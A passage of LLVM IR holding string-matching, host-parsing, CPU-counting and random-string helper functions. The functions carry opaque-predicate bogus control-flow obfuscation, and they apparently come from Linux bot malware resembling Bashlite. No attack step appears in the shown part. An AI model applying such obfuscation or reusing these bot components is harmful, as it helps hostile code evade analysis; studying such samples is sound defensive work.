    i32 63, label %69
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %140

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %49

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %47

; <label>:24:                                     ; preds = %19
  %25 = load i32, i32* @x.31
  %26 = load i32, i32* @y.32
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %4, align 8
  %34 = load i8*, i8** %5, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @wildString(i8* %33, i8* %35)
  %37 = icmp ne i32 %36, 0
  %38 = xor i1 %37, true
  %39 = load i32, i32* @x.31
  %40 = load i32, i32* @y.32
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2, %19
  %48 = phi i1 [ false, %19 ], [ %38, %originalBBpart2 ]
  br label %49

; <label>:49:                                     ; preds = %47, %13
  %50 = phi i1 [ true, %13 ], [ %48, %47 ]
  %51 = load i32, i32* @x.31
  %52 = load i32, i32* @y.32
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %49
  %59 = xor i1 %50, true
  %60 = zext i1 %59 to i32
  store i32 %60, i32* %3, align 4
  %61 = load i32, i32* @x.31
  %62 = load i32, i32* @y.32
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart214, label %originalBB8alteredBB

originalBBpart214:                                ; preds = %originalBB8
  br label %140

; <label>:69:                                     ; preds = %2
  %70 = load i32, i32* @x.31
  %71 = load i32, i32* @y.32
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %69
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp ne i32 %80, 0
  %82 = load i32, i32* @x.31
  %83 = load i32, i32* @y.32
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %81, label %90, label %114

; <label>:90:                                     ; preds = %originalBBpart218
  %91 = load i32, i32* @x.31
  %92 = load i32, i32* @y.32
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %90
  %99 = load i8*, i8** %4, align 8
  %100 = getelementptr inbounds i8, i8* %99, i64 1
  %101 = load i8*, i8** %5, align 8
  %102 = getelementptr inbounds i8, i8* %101, i64 1
  %103 = call i32 @wildString(i8* %100, i8* %102)
  %104 = icmp ne i32 %103, 0
  %105 = xor i1 %104, true
  %106 = load i32, i32* @x.31
  %107 = load i32, i32* @y.32
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart230, label %originalBB20alteredBB

originalBBpart230:                                ; preds = %originalBB20
  br label %114

; <label>:114:                                    ; preds = %originalBBpart230, %originalBBpart218
  %115 = phi i1 [ false, %originalBBpart218 ], [ %105, %originalBBpart230 ]
  %116 = xor i1 %115, true
  %117 = zext i1 %116 to i32
  store i32 %117, i32* %3, align 4
  br label %140

; <label>:118:                                    ; preds = %2
  %119 = load i8*, i8** %4, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = call i32 @toupper(i32 %121) #10
  %123 = load i8*, i8** %5, align 8
  %124 = load i8, i8* %123, align 1
  %125 = zext i8 %124 to i32
  %126 = call i32 @toupper(i32 %125) #10
  %127 = icmp eq i32 %122, %126
  br i1 %127, label %128, label %136

; <label>:128:                                    ; preds = %118
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8*, i8** %5, align 8
  %132 = getelementptr inbounds i8, i8* %131, i64 1
  %133 = call i32 @wildString(i8* %130, i8* %132)
  %134 = icmp ne i32 %133, 0
  %135 = xor i1 %134, true
  br label %136

; <label>:136:                                    ; preds = %128, %118
  %137 = phi i1 [ false, %118 ], [ %135, %128 ]
  %138 = xor i1 %137, true
  %139 = zext i1 %138 to i32
  store i32 %139, i32* %3, align 4
  br label %140

; <label>:140:                                    ; preds = %136, %114, %originalBBpart214, %9
  %141 = load i32, i32* %3, align 4
  ret i32 %141

originalBBalteredBB:                              ; preds = %originalBB, %24
  %142 = load i8*, i8** %4, align 8
  %143 = load i8*, i8** %5, align 8
  %144 = getelementptr inbounds i8, i8* %143, i64 1
  %145 = call i32 @wildString(i8* %142, i8* %144)
  %146 = icmp ne i32 %145, 0
  %_ = shl i1 %146, true
  %_1 = shl i1 %146, true
  %_2 = shl i1 %146, true
  %_3 = shl i1 %146, true
  %_4 = sub i1 false, %146
  %gen = add i1 %_4, true
  %_5 = sub i1 %146, true
  %gen6 = mul i1 %_5, true
  %_7 = shl i1 %146, true
  %147 = xor i1 %146, true
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %49
  %_9 = sub i1 false, %50
  %gen10 = add i1 %_9, true
  %_11 = sub i1 %50, true
  %gen12 = mul i1 %_11, true
  %148 = xor i1 %50, true
  %149 = zext i1 %148 to i32
  store i32 %149, i32* %3, align 4
  br label %originalBB8

originalBB16alteredBB:                            ; preds = %originalBB16, %69
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp ne i32 %152, 0
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %90
  %154 = load i8*, i8** %4, align 8
  %155 = getelementptr inbounds i8, i8* %154, i64 1
  %156 = load i8*, i8** %5, align 8
  %157 = getelementptr inbounds i8, i8* %156, i64 1
  %158 = call i32 @wildString(i8* %155, i8* %157)
  %159 = icmp ne i32 %158, 0
  %_21 = sub i1 false, %159
  %gen22 = add i1 %_21, true
  %_23 = sub i1 %159, true
  %gen24 = mul i1 %_23, true
  %_25 = sub i1 %159, true
  %gen26 = mul i1 %_25, true
  %_27 = sub i1 %159, true
  %gen28 = mul i1 %_27, true
  %160 = xor i1 %159, true
  br label %originalBB20
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #4
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* @x.33
  %16 = load i32, i32* @y.34
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i32, i32* %3, align 4
  %24 = load i32, i32* @x.33
  %25 = load i32, i32* @y.34
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %23

originalBBalteredBB:                              ; preds = %originalBB, %14
  %32 = load i32, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = load i32, i32* @x.35
  %3 = load i32, i32* @y.36
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i32, i32* @x.35
  %12 = load i32, i32* @y.36
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %19

; <label>:19:                                     ; preds = %originalBBpart24, %originalBBpart2
  %20 = load i8*, i8** %10, align 8
  %21 = load i8, i8* %20, align 1
  %22 = icmp ne i8 %21, 0
  br i1 %22, label %23, label %48

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* @x.35
  %25 = load i32, i32* @y.36
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i8*, i8** %10, align 8
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 @toupper(i32 %34) #10
  %36 = trunc i32 %35 to i8
  %37 = load i8*, i8** %10, align 8
  store i8 %36, i8* %37, align 1
  %38 = load i8*, i8** %10, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %10, align 8
  %40 = load i32, i32* @x.35
  %41 = load i32, i32* @y.36
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %19

; <label>:48:                                     ; preds = %19
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %49 = alloca i8*, align 8
  store i8* %0, i8** %49, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %50 = load i8*, i8** %10, align 8
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = call i32 @toupper(i32 %52) #10
  %54 = trunc i32 %53 to i8
  %55 = load i8*, i8** %10, align 8
  store i8 %54, i8* %55, align 1
  %56 = load i8*, i8** %10, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %10, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %146, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %148

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %146

; <label>:19:                                     ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

; <label>:22:                                     ; preds = %originalBBpart24, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

; <label>:27:                                     ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

; <label>:32:                                     ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

; <label>:37:                                     ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  %39 = load i32, i32* @x.37
  %40 = load i32, i32* @y.38
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %37
  %47 = load i32, i32* @x.37
  %48 = load i32, i32* @y.38
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %55, label %74

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* @x.37
  %57 = load i32, i32* @y.38
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %6, align 8
  %66 = load i32, i32* @x.37
  %67 = load i32, i32* @y.38
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %22

; <label>:74:                                     ; preds = %originalBBpart2
  br label %75

; <label>:75:                                     ; preds = %111, %74
  %76 = load i32, i32* @x.37
  %77 = load i32, i32* @y.38
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %84 = load i8*, i8** %6, align 8
  %85 = load i8*, i8** %6, align 8
  %86 = call i64 @strlen(i8* %85) #10
  %87 = sub i64 %86, 1
  %88 = getelementptr inbounds i8, i8* %84, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 13
  %92 = load i32, i32* @x.37
  %93 = load i32, i32* @y.38
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br i1 %91, label %109, label %100

; <label>:100:                                    ; preds = %originalBBpart210
  %101 = load i8*, i8** %6, align 8
  %102 = load i8*, i8** %6, align 8
  %103 = call i64 @strlen(i8* %102) #10
  %104 = sub i64 %103, 1
  %105 = getelementptr inbounds i8, i8* %101, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 10
  br label %109

; <label>:109:                                    ; preds = %100, %originalBBpart210
  %110 = phi i1 [ true, %originalBBpart210 ], [ %108, %100 ]
  br i1 %110, label %111, label %117

; <label>:111:                                    ; preds = %109
  %112 = load i8*, i8** %6, align 8
  %113 = load i8*, i8** %6, align 8
  %114 = call i64 @strlen(i8* %113) #10
  %115 = sub i64 %114, 1
  %116 = getelementptr inbounds i8, i8* %112, i64 %115
  store i8 0, i8* %116, align 1
  br label %75

; <label>:117:                                    ; preds = %109
  %118 = load i8*, i8** %6, align 8
  %119 = call i8* @strchr(i8* %118, i32 46) #10
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %124

; <label>:121:                                    ; preds = %117
  %122 = load i8*, i8** %6, align 8
  %123 = call i8* @strchr(i8* %122, i32 46) #10
  store i8 0, i8* %123, align 1
  br label %124

; <label>:124:                                    ; preds = %121, %117
  %125 = load i32, i32* @x.37
  %126 = load i32, i32* @y.38
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %124
  %133 = load i8*, i8** %3, align 8
  %134 = load i8*, i8** %6, align 8
  %135 = call i8* @strcpy(i8* %133, i8* %134) #4
  %136 = load i32, i32* %4, align 4
  %137 = call i32 @close(i32 %136)
  store i32 0, i32* %2, align 4
  %138 = load i32, i32* @x.37
  %139 = load i32, i32* @y.38
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %151

; <label>:146:                                    ; preds = %13
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %147, i8 0, i64 4096, i32 16, i1 false)
  br label %8

; <label>:148:                                    ; preds = %8
  %149 = load i32, i32* %4, align 4
  %150 = call i32 @close(i32 %149)
  store i32 1, i32* %2, align 4
  br label %151

; <label>:151:                                    ; preds = %148, %originalBBpart214
  %152 = load i32, i32* %2, align 4
  ret i32 %152

originalBBalteredBB:                              ; preds = %originalBB, %37
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %153 = load i8*, i8** %6, align 8
  %154 = getelementptr inbounds i8, i8* %153, i32 1
  store i8* %154, i8** %6, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  %155 = load i8*, i8** %6, align 8
  %156 = load i8*, i8** %6, align 8
  %157 = call i64 @strlen(i8* %156) #10
  %_ = sub i64 0, %157
  %gen = add i64 %_, 1
  %_7 = sub i64 0, %157
  %gen8 = add i64 %_7, 1
  %158 = sub i64 %157, 1
  %159 = getelementptr inbounds i8, i8* %155, i64 %158
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 13
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %124
  %163 = load i8*, i8** %3, align 8
  %164 = load i8*, i8** %6, align 8
  %165 = call i8* @strcpy(i8* %163, i8* %164) #4
  %166 = load i32, i32* %4, align 4
  %167 = call i32 @close(i32 %166)
  store i32 0, i32* %2, align 4
  br label %originalBB12
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %51, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %53

; <label>:10:                                     ; preds = %5
  %11 = load i32, i32* @x.39
  %12 = load i32, i32* @y.40
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %19)
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %21 = call i8* @strstr(i8* %20, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %23 = icmp eq i8* %21, %22
  %24 = load i32, i32* @x.39
  %25 = load i32, i32* @y.40
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %51

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.39
  %34 = load i32, i32* @y.40
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* %1, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %1, align 4
  %43 = load i32, i32* @x.39
  %44 = load i32, i32* @y.40
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br label %51

; <label>:51:                                     ; preds = %originalBBpart25, %originalBBpart2
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:53:                                     ; preds = %5
  %54 = load i32, i32* @x.39
  %55 = load i32, i32* @y.40
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %53
  %62 = load i32, i32* %2, align 4
  %63 = call i32 @close(i32 %62)
  %64 = load i32, i32* %1, align 4
  %65 = load i32, i32* @x.39
  %66 = load i32, i32* @y.40
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  ret i32 %64

originalBBalteredBB:                              ; preds = %originalBB, %10
  %73 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %73)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %75 = call i8* @strstr(i8* %74, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %76 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %77 = icmp eq i8* %75, %76
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %78 = load i32, i32* %1, align 4
  %_ = sub i32 %78, 1
  %gen = mul i32 %_, 1
  %_2 = sub i32 0, %78
  %gen3 = add i32 %_2, 1
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %1, align 4
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %53
  %80 = load i32, i32* %2, align 4
  %81 = call i32 @close(i32 %80)
  %82 = load i32, i32* %1, align 4
  br label %originalBB7
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %38

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.41
  %21 = load i32, i32* @y.42
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.41
  %31 = load i32, i32* @y.42
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:38:                                     ; preds = %6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %39 = load i32, i32* %5, align 4
  %_ = sub i32 %39, 1
  %gen = mul i32 %_, 1
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %5, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
